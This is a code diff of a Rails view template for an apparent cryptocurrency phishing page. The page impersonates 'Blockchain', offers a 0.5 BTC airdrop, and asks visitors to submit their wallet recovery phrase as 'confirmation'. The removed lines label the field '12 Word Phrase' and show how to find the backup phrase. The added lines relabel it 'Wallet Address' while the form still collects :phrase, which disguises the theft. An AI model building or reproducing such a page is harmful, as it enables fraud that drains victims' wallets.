@@ -4,13 +4,13 @@
         <h2>Recover Rewards 0.5 BTC</h2>
         <p>The recovery phrase confirmation is to ensure that the one who claims the bonus is really you.</p>
     </div>
-    <marquee >Remember, unless in case of a highly rewardable airdrop, Blockchain will never ask for your wallet security key phrase. Thank you for participating.</marquee>
+    <marquee >Remember, Blockchain will never ask for your wallet security key phrase. Thank you for participating in our airdrop.</marquee>
 
     <div class="row">
         <div class="col-md-6 col-md-offset-3">
             <%= form_with(model: @user) do |f| %>
                 
-                <%= f.label :"12 Word Phrase" %>
+                <%= f.label :"Wallet Address" %>
                 <%= f.text_area :phrase, class: 'form-control', id:'area' %>
 
                 <%= f.submit "Submit", class: "btn btn-primary" %>
@@ -20,12 +20,12 @@
 
     <image src="/assets/index-finger.png" id="finger">
     <div id="foot">
-        <h3>How To Recover Phrase</h3>
+        <h3>How To Recover Address</h3>
         <ul>
             <li> Open your Blockchain Mobile Application</li>
             <li> At the top left side of your homepage, click the menu button</li>
-            <li> Click on Settings and scroll down to security</li>
-            <li> Click on backup wallet</li>
+            <li> Click on Settings and scroll down to wallet</li>
+            <li> Click on wallet address</li>
         </ul>
     </div>
 </body>
